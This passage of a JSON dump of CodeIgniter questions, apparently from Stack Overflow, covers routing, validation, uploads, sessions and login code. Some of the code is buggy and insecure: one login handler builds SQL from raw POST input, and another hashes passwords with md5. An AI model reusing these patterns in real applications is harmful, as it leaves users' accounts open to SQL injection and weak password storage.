'main/join';\n$route['activate/(:any)']     = \"main/activate/$1\";\n$route['login']               = 'main/login';\n$route['logout']              = 'main/logout';\n$route['main/login']          = 'main/login';\n$route['main/join']           = 'main/join';\n$route['url/short']           = 'url/short';\n$route['user']                = 'user/index';\n$route['user/index']          = 'user/index';\n$route['user/index/(:num)']   = 'user/index/$1';\n$route['profile']             = 'user/profile'; \n$route['user/delete/(:any)']  = \"user/delete/$1\";\n\n$route['(:any)']              = \"url/go/$1\";\n</code></pre>\n\n<p>Well, as you see, I implemented language as mentioned on CI Wiki <a href=\"https://github.com/EllisLab/CodeIgniter/wiki/URI-Language-Identifier\" rel=\"nofollow\">here</a>.</p>\n\n<p>But now the last line of route is not functioning normally.</p>\n\n<pre><code>$route['(:any)']              = \"url/go/$1\";\n</code></pre>\n\n<p>For example, <code>myshortner.com/as34v</code> should match with above route and redirect to full URL, but instead it redirects to <code>0.0.0.1</code> ! How can I fix this?</p>\n"},{"tags":["codeigniter","expressionengine"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":13289469,"title":"ip address 0.0.0.0 in acces logs","body":"<p>One of the admins of a site we are maintaining is unable to log into the CP after i upgraded EE to 2.5.3</p>\n\n<p>What I am seeing in the acces logs, is that before, she always (succesfully) logged in from the ip address 0.0.0.0. I guess she still tries to log in from this ip now, but EE blocks this. </p>\n\n<p>Is there something I can do, or is the issue caused by her local situation?</p>\n"},{"tags":["codeigniter","mailchimp"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":10,"score":0,"question_id":13290198,"title":"How to store birthday through mailchimp API?","body":"<p>I'm using mailchimp 1.3 in a Codeigniter application through <a href=\"https://github.com/waynhall/CodeIgniter-Library-for-MailChimp-API-v1.3\" rel=\"nofollow\">this library</a>.</p>\n\n<p>I have this piece of code:</p>\n\n<pre><code>$birthday = date('m/d', strtotime('1984-04-29');\necho $birthday;\n$merge_vars = array(\n'FNAME'=&gt; $profile_info['name'], \n'LNAME'=&gt; $profile_info['lastname'], \n'birthday' =&gt; $birthday,\n'GROUPINGS' =&gt; array(array('name' =&gt; $this-&gt;group_name, 'groups' =&gt; $this-&gt;group1))\n);\n\n$this-&gt;mail_chimp-&gt;listSubscribe($this-&gt;list_id, $email, $merge_vars);\n</code></pre>\n\n<p>The subscription works and in the administration panel of mailchimp I can see the user name and lastname, but no birthday.</p>\n\n<p>In the api documentation it says it should be formatted as MM/DD and echoing the\nbirthday I verified it was right.\nAny suggestions?</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":23,"score":1,"question_id":13291982,"title":"Passing DIV through $data variable, but with an Echo Statement in String","body":"<p>Confused by the title? hehe. Not sure how to explain this one, but I think my snippet of code should explain things a little easier. </p>\n\n<p>This is what I'm trying to pass through the <code>$data</code> variable. <code>div</code> is displayed as it should be, but the <code>echo</code> statement inside (which I need) is NOT displayed.</p>\n\n<p>Where am I messing up?</p>\n\n<p><code>$data['packagename'] = '&lt;div class=\"somedoodoo\"&gt; echo $row-&gt;subscription &lt;/div&gt;';</code></p>\n"},{"tags":["forms","validation","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":13289208,"title":"CodeIgniter Form Validation Order","body":"<p>I have a login form with validation that works except for one use case.</p>\n\n<p>If a user enters a valid email address and no password I want only the \"The password is required\" message to appear but right now both \"The password is required\" message and the \"Incorrect Email/Password\" message are appearing. </p>\n\n<p>I understand why but don't know how to change this code so that the callback only runs if the other validation has been passed.</p>\n\n<pre><code>public function login_validation() {\n    $this-&gt;load-&gt;library('form_validation');\n    $this-&gt;form_validation-&gt;set_rules('email', 'Email', 'required|valid_email|trim|xss_clean|callback_validate_credentials');\n    $this-&gt;form_validation-&gt;set_rules('password', 'Password', 'required|md5');\n    $this-&gt;form_validation-&gt;set_error_delimiters('&lt;div class=\"alert alert-error\"&gt;', '&lt;/div&gt;&lt;br /&gt;');\n\n    if ($this-&gt;form_validation-&gt;run()) {\n        $data = array(\n            'email' =&gt; $this-&gt;input-&gt;post('email'),\n            'staff_logged_in' =&gt; 1\n        );\n        $this-&gt;session-&gt;set_userdata($data);\n        redirect('clock/clock');\n    } else {\n        $this-&gt;load-&gt;view('login/login');\n    }\n}\n\npublic function validate_credentials() {\n    $this-&gt;load-&gt;model('staff_model');\n\n    if ($this-&gt;staff_model-&gt;can_log_in()) {\n        return true;\n    } else {\n        $this-&gt;form_validation-&gt;set_message('validate_credentials', 'Incorrect Email/Password');\n        return false;\n    }\n\n}\n</code></pre>\n"},{"tags":["codeigniter","web-applications","tankauth"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":12,"score":0,"question_id":13285328,"title":"Constraining tank_auth views to a div on a web age","body":"<p>Hi Tank_auth &amp; web Gurus!</p>\n\n<p>I have tank_auth working with my CodeIgniter application. Currently, the login/register views of tank_auth take over the entire screen. On my website, I would like the login/register views to occupy a div that I define. For example, I want the login/pw fields to just appear in the top right corner and not take over the whole screen...Can you point me in the right direction? - I read somewhere that I'd have to somehow constrain the view in a div but for the life of me I did not understand how!</p>\n\n<p>Much obliged,</p>\n\n<p>Mmiz</p>\n"},{"tags":["php","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":26,"score":2,"question_id":13271151,"title":"CodeIgniter: load model in each library or kind of 'pass' the model from within the controller to a library","body":"<p>im currently working with CodeIgniter.\nMy Front Controller loads 1 of 2 Library depending on the input he gets.\nBoth of the librarys need access to the model. \nMy question:\nShould I load the model in each library (plus get_instance() of CI in every Library to even get access to the CI load func) or is there any \"better\" solution to load the model in the Frontcontroller und 'pass' the model to either one or the other library. I even check the autoload possibilty but even then I dont have direct access from within the librarys.\nI guess it isnt the best solution to load the model in every library (like, what if i need more libraries and so on) , but im kind of stuck right now.. :-(\n<br>In a nutshell: \n<br>- load the model in the FrontController and maybe \"pass\" the model as an argument to any library I need?\n<br>- or get the instance of CI within any library und then load the model (and write redundant code)\n<br>- or is there even a way better solution?</p>\n\n<p>thx in advance :-)</p>\n\n<h2>edit:<br></h2>\n\n<p>I go with:\n<br>\npublic function __construct()<br>\n{<br>\n$this->ci_instance =&amp; get_instance(); <br>\n$this->ci_instance->load->model('my_model');<br>\n$this->_model = $this->ci_instance->my_model; <br>\n}<br></p>\n\n<p>and then use the functions like this: <br>\n$mysql_result = $this->_model->get_testdata();\n<br> </p>\n\n<p>It is a little bit shorter than the solution from the tank auth lib (but almost the same). :-)\nBut the Tank Auth Lib helped me too (to see how the pros do it).\nThx for that too dm03514!</p>\n"},{"tags":["codeigniter","pdf-generation","blank-page","mpdf"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13290779,"title":"Using mpdf with codeigniter generate blank output","body":"<p>I have been flowing this <a href=\"http://www.badcaffeine.com/index.php/blog/comments/Using-mpdf-with-codeigniter-to-generate-pdfs-from-html-and-css/\" rel=\"nofollow\">post</a> to generate a pdf but the output is blank and there is no error displayed , i have put :</p>\n\n<pre><code>public function generate_pdf()\n{\n    $this-&gt;load-&gt;library('mpdf');\n    $mpdf=new mPDF('utf-8','A4');\n    $mpdf-&gt;WriteHTML('&lt;p&gt;HTML content goes here...&lt;/p&gt;');\n    $mpdf-&gt;Output();\n}\n</code></pre>\n\n<p>When i put : </p>\n\n<pre><code>public function generate_pdf()\n{\n    $this-&gt;load-&gt;library('mpdf');\n    $mpdf=new mPDF('utf-8','A4');\n    $mpdf-&gt;debug = true;\n    $mpdf-&gt;WriteHTML('&lt;p&gt;HTML content goes here...&lt;/p&gt;');\n    $mpdf-&gt;Output();\n}\n</code></pre>\n\n<p>referred to this <a href=\"http://stackoverflow.com/a/8123433/874800\">answer</a> , i get this error :</p>\n\n<pre><code>Output has already been sent from the script - PDF file generation aborted.\n</code></pre>\n"},{"tags":["mysql","select","codeigniter","where-clause"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":6708,"score":2,"question_id":2975987,"title":"CodeIgniter: How to use WHERE clause and OR clause","body":"<p>I am using the following code to select from a MySQL database with a Code Igniter webapp:</p>\n\n<pre><code>$query = $this-&gt;db-&gt;get_where('mytable',array('id'=&gt;10));\n</code></pre>\n\n<p>This works great! But I want to write the following MySQL statement using the CI library?</p>\n\n<pre><code>SELECT * FROM `mytable` WHERE `id`='10' OR `field`='value'\n</code></pre>\n\n<p>Any ideas?\nThanks!</p>\n"},{"tags":["php","codeigniter","pyrocms"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":19,"score":-2,"question_id":13278913,"title":"Adding to the default page model in PyroCMS","body":"<p>I want to have 2 default chunks instead of 1 when making a new page.</p>\n\n<p>The reason is, my main template is split into 2 sections and I want to start with 2 chunks.</p>\n\n<p>What I would like to do is edit the page module so that whenever a user creates a new page they will always start with 2 chunks that I have named and defined. </p>\n\n<p>What would I have to modify in order to achieve this?</p>\n\n<p>Note: I already modified the page module and database to add some custom fields. I assume this is the same deal but I can't find where the initial chunk is being created...</p>\n"},{"tags":["php","codeigniter","continuous-integration"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1204,"score":1,"question_id":5085836,"title":"CodeIgniter blank screen after migration","body":"<p>So I have a site written using the CI framework. It worked fine on the original host (Apache). It works fine locally (IIS 7 Express). We have just purchased a new VPS (Windows Server 2008 R2) and php was pre-installed (PHP Version 5.2.10) now when I go to the site I get a blank page.</p>\n\n<p>After debugging by simply printing 'OK' ever so often I determined CodeIgniter.php is failling over on:</p>\n\n<pre><code>$CI  = new $class();\n</code></pre>\n\n<p>Now to try and tackle the problem I have gone into config.php and set:</p>\n\n<pre><code>$config['log_threshold'] = 4; \n</code></pre>\n\n<p>However I am not even getting any log files. I noticed the permissions were not enabled for write so I went to \"c:\\inetput\\wwwroot\" and set max permissions for user \"IIS_IUSRS\"</p>\n\n<p>Unfortunatly still, no log file is created. \"index.php\" is still blank so I am totally confused. This is my first time working with a CI app. Please help!</p>\n\n<p>Edit: Ensured MySQL Installed and MySQL enabled for PHP</p>\n\n<p>Thanks\nChris</p>\n"},{"tags":["php","validation","codeigniter","form-validation"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":29,"score":1,"question_id":13285030,"title":"How to prevent displaying double validation errors in CI?","body":"<p>I'm setting the same callback function for multiple fields in my form:</p>\n\n<pre><code>foreach($fields as $class =&gt; $i)\n{\n    ++$i;\n    $validation-&gt;set_rules('car_' . $i . '_one', $class, 'trim|xss_clean|callback_validate_car_fields[TRUE]');\n    $validation-&gt;set_rules('car_' . $i . '_twor', $class, 'trim|xss_clean|callback_validate_car_fields[FALSE]');\n    $validation-&gt;set_rules('in_car_' . $i . '_one', $class, 'trim|xss_clean|callback_validate_car_fields[TRUE]');\n    $validation-&gt;set_rules('in_car_' . $i . '_two', $class, 'trim|xss_clean|callback_validate_car_fields[FALSE]');\n}\n</code></pre>\n\n<p>(<code>class</code> variale is the <code>Car</code> in this case)</p>\n\n<p>Here is the callback function:</p>\n\n<pre><code>function validate_car_fields($input, $required)\n{\n\n    if ($required === \"TRUE\" &amp;&amp; empty($input))\n    {\n        $this-&gt;form_validation-&gt;set_message('validate_car_fields', 'Field %s can not be empty!');\n        return FALSE;\n    }\n\n    return TRUE;\n}\n</code></pre>\n\n<p>And it is showing the doubled errors:</p>\n\n<pre><code>* Field Car can not be empty!\n* Field Car can not be empty!\n* Field Car can not be empty!\n* Field Car can not be empty!\n</code></pre>\n\n<p>It is understandable behaviour in this case, but I would like to show just one error per <strong>field name</strong>, instead of 4 for each field. How this can be done?</p>\n"},{"tags":["php","forms","codeigniter","popup"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":18,"score":0,"question_id":13289884,"title":"Send Data from Popup to Main form","body":"<p>i have a popup window codeigniter, i want send IDSatker to my main form in form registration member</p>\n\n<p>here's my code</p>\n\n<pre><code>&lt;?php\nif (count($ListSatker) &gt; 0) {\n    echo \"&lt;table border='1' cellspacing='0' cellpadding='3' width='100%'&gt;\\n\";\n    echo \"&lt;tr valign='top'&gt;\\n\";\n    echo \"\n    &lt;th&gt;&lt;div align='center'&gt;ID&lt;/th&gt;\\n\n    &lt;th&gt;&lt;div align='center'&gt;Inst SatkerKD&lt;/th&gt;\n    &lt;th&gt;&lt;div align='center'&gt;Inst SatkerInduk&lt;/th&gt;\n    &lt;th&gt;&lt;div align='center'&gt;Nama Satker&lt;/th&gt;\n    &lt;th&gt;&lt;div align='center'&gt;Status&lt;/th&gt;\n    &lt;th&gt;&lt;div align='center'&gt;Pilhan&lt;/th&gt;\\n\";\n    echo \"&lt;/tr&gt;\\n\";\n    foreach ($ListSatker as $key =&gt; $list) {\n        echo \"&lt;tr valign='top'&gt;\\n\";\n        echo \"&lt;td&gt;&lt;div align='center'&gt;\" . $list['IDSatker'] . \"&lt;/td&gt;\\n\";\n        echo \"&lt;td&gt;&lt;div align='center'&gt;\" . $list['inst_satkerkd'] . \"&amp;nbsp;&lt;/td&gt;\\n\";\n        echo \"&lt;td&gt;&lt;div align='center'&gt;\" . $list['inst_satkerinduk'] . \"&lt;/td&gt;\\n\";\n        echo \"&lt;td&gt;\" . $list['inst_nama'] . \"&lt;/td&gt;\\n\";\n        echo \"&lt;td&gt;\" . $list['inst_akronim'] . \"&lt;/td&gt;\\n\";\n        echo \"&lt;td&gt;&lt;div align='center'&gt;\";\n        echo anchor('user/' . $list['IDSatker'], 'Pilih');\n            echo \"&lt;/td&gt;\\n\";\n        }\n        echo \"&lt;/table&gt;\";\n    } ?&gt;\n</code></pre>\n\n<p>i will send IDSatker when i clik \"Pilih\" to Main Form in apllication/view</p>\n\n<pre><code>&lt;input name=\"inst_satkerkd\" type=\"text\" size=\"30\" value=\"\" /&gt;&lt;?php echo anchor_popup('user/popup', 'Satker', $atts); ?&gt;\n</code></pre>\n\n<p>thank's before</p>\n"},{"tags":["php","codeigniter"],"answer_count":3,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":205,"score":1,"question_id":8725872,"title":"Percent character replaced in Codeigniter","body":"<p>In Codeigniter I'm sending a string using POST method as <code>\"%100\"</code> and it becomes <code>\"0\"</code>. I believe this is because they're being treated as encoded, but they're not.</p>\n\n<p>Is there anyway to cancel this while still keeping security high, as this seems be caused by <code>Security-&gt;xss_clean()</code> and <code>Common remove_invisible_characters()</code></p>\n"},{"tags":["php","file","codeigniter","session","login"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13288923,"title":"codeigiter admin panel file structure","body":"<p>I am having difficulty seting up a admin section with a codeigniter.</p>\n\n<p>I have just added a new folder in controller folder called fam_Admin.</p>\n\n<p>So structure is like following:</p>\n\n<p>-controllers <br>\n  --->fam_admin <br>\n     ---->-login.php <br></p>\n\n<p>in routes.php I added the following code:\n         <code>$route['fam_admin'] = \"fam_admin/login\";</code></p>\n\n<pre><code>&lt;?php\nclass Login extends CI_Controller {\n  public function index() {\n    //$login['main_content'] = '/fam_admin/login';\n    //$this -&gt; load -&gt; view('fam_admin/includes/template', $login);\n    $this -&gt; load -&gt; view('fam_admin/login');\n  }\n  public function validate_login() {\n    $username = $this -&gt; input -&gt; post('username');\n    $password = $this -&gt; input -&gt; post('password');\n    $this -&gt; load -&gt; library('form_validation');\n    $this -&gt; form_validation -&gt; set_rules('username', 'username', 'trim|required');\n    $this -&gt; form_validation -&gt; set_rules('password', 'password', 'trim|required|callback_credential_check');\n    if ($this -&gt; form_validation -&gt; run() == FALSE) {\n      $this -&gt; load -&gt; view('fam_admin/login');\n    }\n  }\n  public function credential_check() {\n    //Field validation succeeded.&amp;nbsp; Validate against database\n    $username = $this -&gt; input -&gt; post('username');\n    $password = $this -&gt; input -&gt; post('password');\n    $this -&gt; load -&gt; model('fam_admin/admin');\n    //query the database\n    $query = $this -&gt; admin -&gt; check_login($username, $password);\n    if (!$query) {\n      $this -&gt; form_validation -&gt; set_message('login_check', 'Invalid username or password');\n      return false;\n      $this -&gt; index();\n    } else {\n      $data = array(\n        'username' =&gt; $this -&gt; input -&gt; post('username'),\n        'is_logged_in' =&gt; true\n      );\n      $this -&gt; session -&gt; set_userdata($data);\n      //redirect('fam_admin/main_section');\n      redirect('site/logged_in');\n    }\n  }\n}\n?&gt;\n</code></pre>\n\n<p>Above is the code for login.php but when the login credentials are validated it gives following error in google chrome. You can try it by entering false credentials and it should give you errors and load the same login form.</p>\n\n<p>The website encountered an error while retrieving <a href=\"http://www.famtripsandinspectionvisits.com/index.php/fam_admin/login/validate_login\" rel=\"nofollow\">http://www.famtripsandinspectionvisits.com/index.php/fam_admin/login/validate_login</a>. It may be down for maintenance or configured incorrectly.</p>\n\n<p>I have been trying to get this to work since last night but still no success.</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":13287931,"title":"Validate if a file is selected for upload in codeigniter","body":"<p>Hi I'm having some trouble about the upload file part. Well basically I have a form with upload logo part wherein if a user doesn't select a logo he/she can still update his/her profile at the same time the user can also choose to upload a logo but it has some limitations. Now I don't know how I can validate that part to know if he/she chooses an image or not. Here's my code so far in CI controller:</p>\n\n<pre><code>if (//CHECK IF THERE IS A FILE FOR UPLOAD){\n                $new_name = $data['id'];\n\n                $config['upload_path'] = './Logos/';\n                $config['allowed_types'] = 'jpg|png|gif';\n                $config['max_size'] = '100';\n                $config['max_width']  = '100';\n                $config['max_height']  = '100';\n\n                $this-&gt;load-&gt;library('upload', $config);\n\n                    if ( ! $this-&gt;upload-&gt;do_upload())\n                    {\n                        array_push($data['error_message'], \"You have the following errors in your entry:\\n\");\n                        array_push($data['error_message'], \"- Logo must be 100x100 pixels in size not exceeding 100KB with JPG,PNG or GIF format\");\n                        array_push($data['error_message'], \"\\nLogo upload failed.\");\n                        $data['check_error'] = true;\n                    }\n                    else\n                    {\n                        $data = array('upload_data' =&gt; $this-&gt;upload-&gt;data());\n\n                        //DO UPDATE PART HERE\n                        $file = $data['upload_data']['file_name'];\n                        rename($config['upload_path'] . $file, $config['upload_path'] .$new_name.'.jpg');\n                        //GO TO SETTINGS\n                        $this-&gt;load-&gt;helper('url');  \n                        redirect($data['base'].'settings');\n                    }\n                }\n</code></pre>\n\n<p>The part in if is where I wanted to set a validations. I tried some tricks but all of those doesn't work properly.</p>\n\n<p>Here's my view part where if the logo of the certain ID already exists it's just display his/her logo or else displays the default logo:</p>\n\n<pre><code> &lt;tr&gt;\n    &lt;td&gt;&lt;p class=\"titles\"&gt;Logo&lt;/p&gt;&lt;/td&gt;\n    &lt;td&gt;\n    &lt;div&gt;\n        &lt;input type=\"text\" id=\"fileName\" class=\"file_input_textbox\" readonly=\"readonly\"&gt;\n\n        &lt;div class=\"file_input_div\"&gt;\n          &lt;input type=\"button\" value=\"Browse\" class=\"file_input_button\" /&gt;\n          &lt;input type=\"file\" class=\"file_input_hidden\" onchange=\"javascript: document.getElementById('fileName').value = this.value\" id=\"upload\" name=\"userfile\" /&gt;\n        &lt;/div&gt;\n    &lt;/div&gt;\n    &lt;/td&gt;\n&lt;/tr&gt;\n\n&lt;tr&gt;\n&lt;td&gt;\n&lt;/td&gt;\n&lt;td&gt;\n&lt;p class=\"titles\"&gt;100px x 100px jpg, png or gif only.&lt;/p&gt;\n&lt;/td&gt;\n&lt;/tr&gt;\n\n&lt;tr&gt;\n&lt;td&gt;&lt;p class=\"titles\"&gt;Current Logo&lt;/p&gt;&lt;/td&gt;\n&lt;td&gt;\n    &lt;img src=\"&lt;?php if(is_array(@getimagesize($base.\"Logos/\".$id.\".jpg\"))){echo $base.\"Logos/\".$id.\".jpg\";}else{echo $base.\"Logos/default.jpg\";} ?&gt;\"  style=\"margin:0px 0px 0px 90px;\"/&gt;\n&lt;/td&gt;\n&lt;/tr&gt;\n</code></pre>\n"},{"tags":["jquery","ajax","codeigniter","history.js"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":13287685,"title":"How to integrate history.js to my ajax site?","body":"<p>I have left and right div in my website and with navigation buttons.\nLet's say button_1, button_2.</p>\n\n<p>When clicking on these button will change the right div content using ajax so means the left div do nothing.</p>\n\n<p>The above is what I have done but I have a problem here, the url doesn't change. And I found history.js is able to solve this issue but I cannot find any tutorial about history.js + ajax.</p>\n\n<p>Can anyone help me out?</p>\n\n<p>Thank in adv</p>\n"},{"tags":[".htaccess","codeigniter","codeigniter-url"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":654,"score":0,"question_id":5398534,"title":"Cannot remove index.php from my urls in Codeigniter","body":"<p>I am using codeigniter and when I set up the website I added necessary code in my .htaccess file to remove index.php (default) from my urls. I just happened to replace my public_html folder from a back up file of my website. Since I did that, I cannot get any of the links on home page to work unless insert index.php in the url between the domain name and the rest of the url as in <a href=\"http://www.obsia.com/index.php/contact/\" rel=\"nofollow\">http://www.obsia.com/index.php/contact/</a> instead of <a href=\"http://www.obsia.com/contact/\" rel=\"nofollow\">http://www.obsia.com/contact/</a> and it works. So, in my config file within the application folder, I changed  </p>\n\n<pre><code>$config['index_page'] = \"\";  \n</code></pre>\n\n<p>to  </p>\n\n<pre><code>$config['index_page'] = \"index.php\";\n</code></pre>\n\n<p>and all the links seem to work now. But how do I remove index.php from the URLs.</p>\n\n<p>Here is what my .htaccess code looks like:  </p>\n\n<pre><code>RewriteEngine on\nRewriteBase / \nRewriteCond $1 !^(index\\.php|public|user_guide|robots\\.txt|css)\nRewriteRule ^(.*)$ /index.php?/$1 [L]\n</code></pre>\n\n<p>Can anyone point me in the right direction. It will much appreciated.</p>\n\n<p>Regards,\nG</p>\n"},{"tags":["session","codeigniter","isset"],"answer_count":5,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":1348,"score":4,"question_id":6239422,"title":"Using Isset with native sessions in CodeIgniter","body":"<p>I've read about how CI handles sessions differently than native sessions and feel slightly insecure about storing all the data in a cookie(?), unlike PHP's native session which only stores the session ID(?). So I've decided to use native sessions without the CI native_session library.</p>\n\n<p>Now, I know that the Input Class in CI validates Isset with a true/false statement like this:</p>\n\n<pre><code>if ($this-&gt;input-&gt;post('something'))\n</code></pre>\n\n<p>which renders the Isset function unable to work (it gives an error). However, I'd like to check my native sessions with the Isset function, so how can I do this? I've tried </p>\n\n<p><code>if (isset($_SESSION['keyHere']))</code> </p>\n\n<p>which gives me an error.</p>\n\n<p>So to sum up: I want to use Isset on my session array as I feel using </p>\n\n<p><code>if ($_SESSION['keyHere'])</code> </p>\n\n<p>without the Isset might be 'dangerous/foolish'.</p>\n\n<p>Also, as a last question I'm curious about which session handling you think is safest? CI's Session Class or PHP's native handling with server-side storage etc.? I'd very much like to feel as safe as possible when it comes to sessions, no matter if it means I'll have to write longer code.</p>\n"},{"tags":["php","jquery","codeigniter"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13285556,"title":"Multiple select in CodeIgniter using jQuery plugin Chosen","body":"<p>I use <a href=\"http://harvesthq.github.com/chosen/\" rel=\"nofollow\">Chosen</a>, a jQuery plugin for forms. I want to have multiselect select field, like this:</p>\n\n<pre><code>&lt;select data-placeholder=\"Developer\" class=\"grid_6 alpha required chzn-select\" name=\"gameDeveloper\" id=\"gameDeveloper\" multiple=\"multiple\"&gt;\n    &lt;optgroup label=\"Developer\"&gt;&lt;/optgroup&gt;\n    &lt;optgroup label=\"A\" class=\"separator\"&gt;&lt;option value=\"36\"&gt;Arc System Works&lt;/option&gt;\n    &lt;option value=\"48\"&gt;Artificial Art &amp; Movement&lt;/option&gt;\n    &lt;option value=\"45\"&gt;AVE Productions&lt;/option&gt;\n    &lt;/optgroup&gt;&lt;optgroup label=\"B\" class=\"separator\"&gt;&lt;option value=\"28\"&gt;Bethesda Softworks&lt;/option&gt;\n    &lt;option value=\"27\"&gt;Black Isle&lt;/option&gt;\n    &lt;option value=\"1\"&gt;Blizzard&lt;/option&gt;\n    (...)\n&lt;/select&gt;\n</code></pre>\n\n<p>I used Chosen like this:</p>\n\n<pre><code>$('#gameDeveloper').chosen({\n    no_results_text: 'Brak wyników'\n});\n</code></pre>\n\n<p>It worked great, but when I want to have multiple choices, it returns something like this:\n<code>gameDeveloper=1&amp;gameDeveloper=2</code>. Problem is, my php script takes only the last part (here: <code>2</code>). </p>\n\n<p>I use CodeIgniter, so my code for this is simply <code>$devs = $this-&gt;input-&gt;post('gameDeveloper');</code>.</p>\n\n<p>What can I do?</p>\n"},{"tags":["php","codeigniter","activerecord","image-processing","imagelibrary"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":40,"score":0,"question_id":13085076,"title":"Resize image without distortion of image in codeigniter","body":"<p>I want to resize image without image being distorted.For example  if i have set the image height to be 100 and width as 200.The image resized must be of 100 height and 200 width.In order to achieve that i want to crop that image instead of getting it distorted.</p>\n\n<p>My config options:-</p>\n\n<pre><code>            $config['create_thumb'] = TRUE;\n            $config['maintain_ratio'] = FALSE;\n            $config['master_dim'] = 'auto';\n            $config['width'] = 100;\n            $config['height']= 100;\n\n            $this-&gt;image_lib-&gt;initialize($config);\n            $this-&gt;image_lib-&gt;resize();\n</code></pre>\n\n<p>Also is it possible without using any other library of image manipulation?</p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":17,"score":1,"question_id":13285360,"title":"Cannot Upload Excel file in CodeIgniter","body":"<p>I would like to upload excel file many times in CodeIgniter, but not successfully</p>\n\n<p>(The filetype you are attempting to upload is not allowed.)</p>\n\n<p>Controller Coding:</p>\n\n<pre><code>                $this-&gt;load-&gt;library('upload');\n                $this-&gt;load-&gt;helper('file');\n                //$config['upload_path'] = XLS_PATH;\n                $config['upload_path'] = './public/test/files/test/';\n                $config['allowed_types'] = 'xls|xlsx';\n                $config['max_size'] = 0;\n\n                $this-&gt;upload-&gt;initialize($config);\n\n                echo $this-&gt;upload-&gt;file_type;\n\n                if (!$this-&gt;upload-&gt;do_upload('userfile'))\n                {\n\n                    echo $this-&gt;upload-&gt;display_errors();\n\n                }\n                else\n                {\n                      $this-&gt;upload-&gt;do_upload('userfile');\n\n                }\n</code></pre>\n\n<p>Views:</p>\n\n<pre><code>&lt;form method=\"post\" enctype=\"multipart/form-data\"&gt;\n&lt;input type=\"file\" id=\"userfile\" name=\"userfile\"/&gt;\n&lt;input type=\"submit\" name=\"submit\" id=\"sumit\" value=\"Test\" /&gt;\n &lt;/form&gt;\n</code></pre>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":19,"score":1,"question_id":13283530,"title":"Codeigniter Printing Query Results","body":"<p>Simple question but I don't know why it is not printing correctly or working as expected. I have this in model (works because when I print_r($result) it shows data:</p>\n\n<pre><code>function get_latest_entries()\n{\n    $query = $this-&gt;db-&gt;get('property');\n    return $query-&gt;result_array();\n}\n</code></pre>\n\n<p>And for controller:</p>\n\n<pre><code>public function index()\n{\n    $resultSet['properties'] = $this-&gt;propertymodel-&gt;get_latest_entries();\n    $this-&gt;load-&gt;view('home', $resultSet);\n}\n</code></pre>\n\n<p>In the view I want to iterate over the array (the table has description, city, address columns):</p>\n\n<pre><code>&lt;?php\nforeach($resultSet as $item)\n{\n    echo $item-&gt;city;\n    echo $item-&gt;description;\n}\n?&gt;   \n</code></pre>\n\n<p>I am getting two records on home page where am displaying the results as above:</p>\n\n<blockquote>\n  <p>Severity: Notice \n  Message: Undefined variable: resultSet \n  Filename: views/home.php \n  Line Number: 16</p>\n</blockquote>\n\n<p>And </p>\n\n<blockquote>\n  <p>Severity: Warning \n  Message: Invalid argument supplied for foreach() \n  Filename: views/home.php \n  Line Number: 16</p>\n</blockquote>\n"},{"tags":["php","codeigniter","session","login","logout"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":13282141,"title":"PHP Codeigniter isn't working properly","body":"<p>I am creating a website with php codeigniter. When I log-in it creates a session and redirects to the home page. When I log out, it destroys the session. When I write the url of the home page it works fine. But if i click on the 'Go back one page button' on the browser, it goes back to the home page. Even though the home page is supposed to check whether I am logged in or not. My code is given below. I hope I am clear in explaining my dilemma. If not, then please ask. Thanks in advance.</p>\n\n<pre><code>public function signin()\n{\n    $this-&gt;form_validation-&gt;set_rules('email2', 'E-mail', 'required|valid_email');\n    $this-&gt;form_validation-&gt;set_rules('password2', 'Password', 'required|min_length[5]');\n    $query = \"select password from user where email = '{$this-&gt;input-&gt;post('email2')}';\";\n\n    if($this-&gt;form_validation-&gt;run())\n    {\n        if($this-&gt;doj_database-&gt;check_signin($query, $this-&gt;input-&gt;post('password2')))\n        {\n            $query = \"select * from user where email = '{$this-&gt;input-&gt;post('email2')}';\";\n            $data['user'] = $this-&gt;doj_database-&gt;search_with_email($query);\n            $newdata = array('logged_in' =&gt; TRUE);\n            $this-&gt;session-&gt;set_userdata($newdata);\n            $url = \"/DIRTY_ONLINE_JUDGE/goto_home/{$data['user']['user_id']}\";\n            redirect($url);\n        }\n        else\n        {\n            $this-&gt;load-&gt;view('wrong_login');\n        }\n    }\n    else\n    {\n        $this-&gt;load-&gt;view('wrong_login');\n    }\n}\n\n\n\n\npublic function goto_home($id)\n{\n    if($this-&gt;session-&gt;userdata('logged_in'))\n    {\n        $data['user'] = 